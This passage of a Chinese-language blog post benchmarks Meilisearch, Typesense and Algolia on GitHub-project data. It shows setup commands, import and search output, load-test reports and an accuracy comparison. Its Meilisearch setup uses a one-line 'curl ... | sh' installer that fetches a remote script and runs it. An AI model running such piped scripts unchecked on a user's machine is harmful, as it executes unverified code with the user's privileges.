data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># Install Meilisearch ， 跳转到 github 了，需要魔法</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">curl</span> <span class=\"token parameter variable\">-L</span> https://install.meilisearch.com <span class=\"token operator\">|</span> <span class=\"token function\">sh</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># Test if it works</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>./meilisearch <span class=\"token parameter variable\">--version</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># Move to user env</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">mv</span> meilisearch /usr/local/bin/</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># Launch Meilisearch</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>meilisearch --master-key<span class=\"token operator\">=</span><span class=\"token string\">\"aSampleMasterKey\"</span></pre></td></tr></table></figure><h3 id=\"数据导入\"><a class=\"anchor\" href=\"#数据导入\">#</a> 数据导入</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 创建索引 </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$ ./searchEngineTest <span class=\"token parameter variable\">-engine</span> <span class=\"token string\">'m'</span> ci</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>create index success </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>run <span class=\"token keyword\">done</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 导入数据</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>$ ./searchEngineTest <span class=\"token parameter variable\">-engine</span> <span class=\"token string\">'m'</span> i</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">add</span> MeillSearch status:enqueued TaskUID: <span class=\"token number\">9</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">add</span> MeillSearch result status:processing </pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">add</span> MeillSearch status:enqueued TaskUID: <span class=\"token number\">10</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">add</span> MeillSearch result status:enqueued </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token function\">add</span> MeillSearch status:enqueued TaskUID: <span class=\"token number\">11</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">add</span> MeillSearch result status:enqueued </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">add</span> MeillSearch status:enqueued TaskUID: <span class=\"token number\">12</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token function\">add</span> MeillSearch result status:enqueued </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">add</span> MeillSearch status:enqueued TaskUID: <span class=\"token number\">13</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token function\">add</span> MeillSearch result status:enqueued </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token function\">add</span> MeillSearch status:enqueued TaskUID: <span class=\"token number\">14</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token function\">add</span> MeillSearch result status:enqueued </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>run <span class=\"token keyword\">done</span></pre></td></tr></table></figure><h3 id=\"搜索\"><a class=\"anchor\" href=\"#搜索\">#</a> 搜索</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ ./searchEngineTest <span class=\"token parameter variable\">-engine</span> <span class=\"token string\">'m'</span> s <span class=\"token parameter variable\">-q</span> <span class=\"token string\">\"Redis\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>TotalHits: <span class=\"token number\">55</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>rid: f18f16d7dd944a36971f8746b7079c87 name: redis </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>rid: 025ed78aac4c4dc79518bd99a1c4e835 name: cachecloud </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>rid: f0cba6ce547c49e2b401b490c035dd3a name: redisbook </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>rid: 152adb02e91a4f9aa7f1f094732ddf00 name: redis-3.0-annotated </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>rid: 7aeda21ce8aa48f2aad621364834d8c0 name: kvrocks </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>rid: 224c17d258284da18b23c982a3dea902 name: godis </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>rid: f951d9abf7db495e99cbc666a70d8ce7 name: pottery </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>rid: d45d81b60d0748329648bcd1858beb88 name: lettuce-core </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>rid: b6839796762b4511b65ffea1e683f9cd name: RedisInsight </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>rid: c6e0beb5ee8d486188c16e7761e3feda name: RedisDesktopManager </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>run don</pre></td></tr></table></figure><h3 id=\"压力测试\"><a class=\"anchor\" href=\"#压力测试\">#</a> 压力测试</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ ./searchEngineTest <span class=\"token parameter variable\">-engine</span> <span class=\"token string\">'m'</span> t</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>start pressure test, duration:1m0s , rate: <span class=\"token number\">100</span>/s</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">..</span>.</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">5999</span>, response:<span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"hits\"</span>:<span class=\"token punctuation\">[</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"Rid\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"f4164844fb7549f7b579d59d19550ca4\"</span>,<span class=\"token string\">\"Tags\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"Elasticsearch CLI Python 测试\"</span>,<span class=\"token string\">\"Author\"</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">6000</span>, response:<span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"hits\"</span>:<span class=\"token punctuation\">[</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"Rid\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"f4164844fb7549f7b579d59d19550ca4\"</span>,<span class=\"token string\">\"Tags\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"Elasticsearch CLI Python 测试\"</span>,<span class=\"token string\">\"Author\"</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> <span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span> report <span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Requests      <span class=\"token punctuation\">[</span>total, rate, throughput<span class=\"token punctuation\">]</span>  <span class=\"token number\">6000</span>, <span class=\"token number\">100.02</span>, <span class=\"token number\">99.95</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Duration      <span class=\"token punctuation\">[</span>total, attack, wait<span class=\"token punctuation\">]</span>      1m0.028549913s, <span class=\"token number\">59</span>.990403058s, <span class=\"token number\">38</span>.146855ms</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Latencies     <span class=\"token punctuation\">[</span>mean, <span class=\"token number\">50</span>, <span class=\"token number\">95</span>, <span class=\"token number\">99</span>, max<span class=\"token punctuation\">]</span>    <span class=\"token number\">18</span>.23064ms, <span class=\"token number\">5</span>.688964ms, <span class=\"token number\">50</span>.404274ms, <span class=\"token number\">52</span>.483802ms, <span class=\"token number\">60</span>.476845ms</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Bytes In      <span class=\"token punctuation\">[</span>total, mean<span class=\"token punctuation\">]</span>              <span class=\"token number\">39942001</span>, <span class=\"token number\">6657.00</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>Bytes Out     <span class=\"token punctuation\">[</span>total, mean<span class=\"token punctuation\">]</span>              <span class=\"token number\">582000</span>, <span class=\"token number\">97.00</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Success       <span class=\"token punctuation\">[</span>ratio<span class=\"token punctuation\">]</span>                    <span class=\"token number\">100.00</span>%</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Status Codes  <span class=\"token punctuation\">[</span>code:count<span class=\"token punctuation\">]</span>               <span class=\"token number\">200</span>:6000  </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Error Set:</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>run <span class=\"token keyword\">done</span></pre></td></tr></table></figure><p>测试结果</p>\n<p>一分钟测试 6000 下，平均耗时 18.23ms，P99 52.48ms，最大 60.47ms</p>\n<h2 id=\"typesense\"><a class=\"anchor\" href=\"#typesense\">#</a> Typesense</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90eXBlc2Vuc2Uub3JnL2RvY3MvZ3VpZGUvaW5zdGFsbC10eXBlc2Vuc2UuaHRtbCNtYWMtYmluYXJ5\">https://typesense.org/docs/guide/install-typesense.html#mac-binary</span></p>\n<h3 id=\"搭建-2\"><a class=\"anchor\" href=\"#搭建-2\">#</a> 搭建</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">curl</span> <span class=\"token parameter variable\">-O</span> https://dl.typesense.org/releases/0.25.1/typesense-server-0.25.1-amd64.deb</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> ./typesense-server-0.25.1-amd64.deb</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># Test if it works</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">curl</span> http://localhost:8108/health</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># &#123;\"ok\":true&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># config api key </span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#/usr/bin/typesense-server --config=/etc/typesense/typesense-server.ini</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">vim</span> /etc/typesense/typesense-server.ini</pre></td></tr></table></figure><h3 id=\"数据导入-2\"><a class=\"anchor\" href=\"#数据导入-2\">#</a> 数据导入</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 创建索引</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$ ./searchEngineTest  <span class=\"token parameter variable\">-engine</span> <span class=\"token string\">'s'</span> ci</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>create index success </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>run <span class=\"token keyword\">done</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 创建导入数据</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>$ ./searchEngineTest  <span class=\"token parameter variable\">-engine</span> <span class=\"token string\">'s'</span> i</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">..</span>.</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">import</span> stauts <span class=\"token boolean\">true</span> document </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>run <span class=\"token keyword\">done</span></pre></td></tr></table></figure><h3 id=\"搜索-2\"><a class=\"anchor\" href=\"#搜索-2\">#</a> 搜索</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ ./searchEngineTest <span class=\"token parameter variable\">-engine</span> <span class=\"token string\">'s'</span> s <span class=\"token parameter variable\">-q</span> <span class=\"token string\">\"Redis\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>TotalHits: <span class=\"token number\">45</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>rid: f18f16d7dd944a36971f8746b7079c87 name: redis </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>rid: 152adb02e91a4f9aa7f1f094732ddf00 name: redis-3.0-annotated </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>rid: c1bd9c95e62645feb520cf87dce52d90 name: redis-faina </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>rid: 7fcaf011245141b9b08aa7145351370c name: redis-tui </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>rid: 74fd12bb23e0468c8d5809be908c4266 name: redis-memory-analyzer </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>rid: 9fdcb81f29764574997a219bc6a12a4a name: AnotherRedisDesktopManager </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>rid: 9ef7be9658c74ba0bf5fafcaaf2843c5 name: dragonfly </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>rid: 025ed78aac4c4dc79518bd99a1c4e835 name: cachecloud </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>rid: 470b8584a2bb4eef91b64be9e74efcda name: haipproxy </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>rid: d212adabfe5043b481ea82bb5964577b name: pika </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>run <span class=\"token keyword\">done</span></pre></td></tr></table></figure><h3 id=\"压力测试-2\"><a class=\"anchor\" href=\"#压力测试-2\">#</a> 压力测试</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>./searchEngineTest <span class=\"token parameter variable\">-engine</span> <span class=\"token string\">'s'</span> t</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>start pressure test, duration:1m0s , rate: <span class=\"token number\">100</span>/s</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">..</span>.</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">6000</span>, response:<span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"facet_counts\"</span>:<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>,<span class=\"token string\">\"found\"</span>:3,<span class=\"token string\">\"hits\"</span>:<span class=\"token punctuation\">[</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"document\"</span>:<span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"Author\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"apache\"</span>,<span class=\"token string\">\"Author_avatar\"</span>:\"https://img.hel </pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> <span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span> report <span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Requests      <span class=\"token punctuation\">[</span>total, rate, throughput<span class=\"token punctuation\">]</span>  <span class=\"token number\">6000</span>, <span class=\"token number\">100.02</span>, <span class=\"token number\">100.01</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Duration      <span class=\"token punctuation\">[</span>total, attack, wait<span class=\"token punctuation\">]</span>      <span class=\"token number\">59</span>.996613429s, <span class=\"token number\">59</span>.989559216s, <span class=\"token number\">7</span>.054213ms</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Latencies     <span class=\"token punctuation\">[</span>mean, <span class=\"token number\">50</span>, <span class=\"token number\">95</span>, <span class=\"token number\">99</span>, max<span class=\"token punctuation\">]</span>    <span class=\"token number\">6</span>.850387ms, <span class=\"token number\">7</span>.021459ms, <span class=\"token number\">7</span>.38063ms, <span class=\"token number\">8</span>.126713ms, <span class=\"token number\">18</span>.582676ms</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Bytes In      <span class=\"token punctuation\">[</span>total, mean<span class=\"token punctuation\">]</span>              <span class=\"token number\">29604004</span>, <span class=\"token number\">4934.00</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Bytes Out     <span class=\"token punctuation\">[</span>total, mean<span class=\"token punctuation\">]</span>              <span class=\"token number\">0</span>, <span class=\"token number\">0.00</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>Success       <span class=\"token punctuation\">[</span>ratio<span class=\"token punctuation\">]</span>                    <span class=\"token number\">100.00</span>%</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Status Codes  <span class=\"token punctuation\">[</span>code:count<span class=\"token punctuation\">]</span>               <span class=\"token number\">200</span>:6000  </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Error Set:</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>run <span class=\"token keyword\">done</span></pre></td></tr></table></figure><p>测试结果</p>\n<p>一分钟测试 6000 下，平均耗时 6.85ms，P99 8.12 ms，最大 18.58ms</p>\n<h2 id=\"algolia\"><a class=\"anchor\" href=\"#algolia\">#</a> Algolia</h2>\n<h3 id=\"搭建-3\"><a class=\"anchor\" href=\"#搭建-3\">#</a> 搭建</h3>\n<p>去 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWxnb2xpYS5jb20v\">https://www.algolia.com/</span>  创建账户</p>\n<p>然后获取 ApplicationId 和 AdminApiKey</p>\n<h3 id=\"数据导入-3\"><a class=\"anchor\" href=\"#数据导入-3\">#</a> 数据导入</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 创建索引 </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$ ./searchEngineTest <span class=\"token parameter variable\">-engine</span> <span class=\"token string\">'a'</span> ci</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>create index success </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>run <span class=\"token keyword\">done</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 导入数据</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>$ ./searchEngineTest <span class=\"token parameter variable\">-engine</span> <span class=\"token string\">'a'</span> i</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>algolia: <span class=\"token function\">add</span> data status:success TaskUID: <span class=\"token number\">11</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>algolia: <span class=\"token function\">add</span> data status:success TaskUID: <span class=\"token number\">12</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>algolia: <span class=\"token function\">add</span> data status:success TaskUID: <span class=\"token number\">13</span></pre></td></tr></table></figure><h3 id=\"搜索-3\"><a class=\"anchor\" href=\"#搜索-3\">#</a> 搜索</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ ./searchEngineTest <span class=\"token parameter variable\">-e</span> <span class=\"token string\">'a'</span> s <span class=\"token parameter variable\">-q</span> <span class=\"token string\">'Redis'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>algolia: TotalHits: <span class=\"token number\">55</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>f951d9abf7db495e99cbc666a70d8ce7 name: pottery </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">..</span>.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>algolia: search success</pre></td></tr></table></figure><h3 id=\"压力测试-3\"><a class=\"anchor\" href=\"#压力测试-3\">#</a> 压力测试</h3>\n<p>没有压力测试</p>\n<h1 id=\"搜索准确度测试\"><a class=\"anchor\" href=\"#搜索准确度测试\">#</a> 搜索准确度测试</h1>\n<p>case :</p>\n<ol>\n<li>git 的开源项目</li>\n<li>下载歌曲</li>\n<li>C++ 开源游戏</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ ./searchEngineTest <span class=\"token parameter variable\">-e</span> <span class=\"token string\">'all'</span> s <span class=\"token parameter variable\">-q</span> <span class=\"token string\">'git的开源项目'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>algolia: TotalHits: <span class=\"token number\">3</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url: https://hellogithub.com/repository/9f0ede723e544988a436471d207f1f8c name: git-history </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url: https://hellogithub.com/repository/4e3b67f2fa3546b2b3d2aece375322f3 name: halo </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>url: https://hellogithub.com/repository/28215d861b284a3f8fbcfe3d7be6459c name: git-point </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>algolia: search success </pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>MeillSearch: TotalHits: <span class=\"token number\">3</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>url: https://hellogithub.com/repository/9f0ede723e544988a436471d207f1f8c name: git-history </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>url: https://hellogithub.com/repository/4e3b67f2fa3546b2b3d2aece375322f3 name: halo </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>url: https://hellogithub.com/repository/28215d861b284a3f8fbcfe3d7be6459c name: git-point </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>MeillSearch: search success </pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>Typesense: TotalHits: <span class=\"token number\">2</span> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>url: https://hellogithub.com/repository/9f0ede723e544988a436471d207f1f8c name: git-history </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>url: https://hellogithub.com/repository/28215d861b284a3f8fbcfe3d7be6459c name: git-point </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Typesense: search success </pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span></pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>./searchEngineTest <span class=\"token parameter variable\">-e</span> <span class=\"token string\">'all'</span> s <span class=\"token parameter variable\">-q</span> <span class=\"token string\">'下载歌曲'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>algolia: TotalHits: <span class=\"token number\">0</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>algolia: search success </pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>MeillSearch: TotalHits: <span class=\"token number\">0</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>MeillSearch: search success </pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Typesense: TotalHits: <span class=\"token number\">86</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>url: https://hellogithub.com/repository/6fd34a7534dd415cbf8990d73427794c name: downkyi </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>url: https://hellogithub.com/repository/81f5028ecf9740dfaba1bc8903146454 name: BBDown </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>url: https://hellogithub.com/repository/98f1c4c0b02c4ea3b0d73d5f471d6ae4 name: XboxDownload </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>url: https://hellogithub.com/repository/18c6ee9f0f8b4fd0a4959abeb0904554 name: GetSubtitles </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>url: https://hellogithub.com/repository/b9e627e8c6f8488b8c4fa1298ef40fe8 name: youtube-dl </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>url: https://hellogithub.com/repository/559f8650da99482884b94fcb2bec963e name: you-get </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>url: https://hellogithub.com/repository/ba6334592d4b4abd95f1f6e45ef2e899 name: marktext </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>url: https://hellogithub.com/repository/6953bd87668843ae97ca491e1b5fb81a name: Motrix </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>url: https://hellogithub.com/repository/78722011ebf84ea8b1f0a19f2e7a8b2a name: lux </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>url: https://hellogithub.com/repository/e2ba8c6839e843bca2215efdea936107 name: Kingfisher </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>Typesense: search success </pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span></pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ ./searchEngineTest <span class=\"token parameter variable\">-e</span> <span class=\"token string\">'all'</span> s <span class=\"token parameter variable\">-q</span> <span class=\"token string\">'C++开源游戏'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>MeillSearch: TotalHits: <span class=\"token number\">8</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url: https://hellogithub.com/repository/b899e2f98f07495aa20a7655b1d716a1 name: Cemu </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url: https://hellogithub.com/repository/4e3f84780ad54eb69b16a95a48d955a5 name: azerothcore-wotlk </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>url: https://hellogithub.com/repository/4b0436482e2e468386f57bd43fd4ffb8 name: xemu </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>url: https://hellogithub.com/repository/fe47d51db0a24dff989863e4f172e085 name: yuzu </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>url: https://hellogithub.com/repository/ea8f86ffd45340f2a33b1a5a59d7543c name: citra </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>url: https://hellogithub.com/repository/8956118d16f94273a97fa793b73ce78c name: Cytopia </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>url: https://hellogithub.com/repository/d4384ff4b84a4fc6acfb7e7ae44b06ce name: ppsspp </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>url: https://hellogithub.com/repository/3603a18c7672445c88bbc404a960b69f name: flatbuffers </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>MeillSearch: search success </pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Typesense: TotalHits: <span class=\"token number\">3</span> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>url: https://hellogithub.com/repository/b899e2f98f07495aa20a7655b1d716a1 name: Cemu </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>url: https://hellogithub.com/repository/4e3f84780ad54eb69b16a95a48d955a5 name: azerothcore-wotlk </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>url: https://hellogithub.com/repository/1d1e346df2174e9d83658d66d3ddfa34 name: Ryujinx </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Typesense: search success </pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>algolia: TotalHits: <span class=\"token number\">16</span> </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>url: https://hellogithub.com/repository/12cea4ffbed74106af665ae418cd9c49 name: osu </pre></td></tr><tr><td data-num=\"21\"></td><td><pre>url: 